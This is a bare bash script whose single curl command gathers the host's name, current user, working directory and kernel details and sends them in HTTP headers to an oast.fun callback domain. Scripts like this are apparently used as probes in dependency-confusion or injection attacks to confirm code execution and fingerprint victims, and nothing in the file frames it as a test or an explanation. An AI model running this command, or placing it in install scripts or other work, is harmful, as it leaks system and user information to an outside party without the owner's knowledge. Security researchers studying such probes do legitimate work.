#!/bin/bash

curl -H "Hostname: $(hostname)" -H "Whoami: $(whoami)" -H "Pwd: $(pwd)" -H "uname-a: $(uname -a)" -d $(uname)  http://banaa.cdesf4c2vtc0000x7z6gggzcz1eyyyyyb.oast.fun
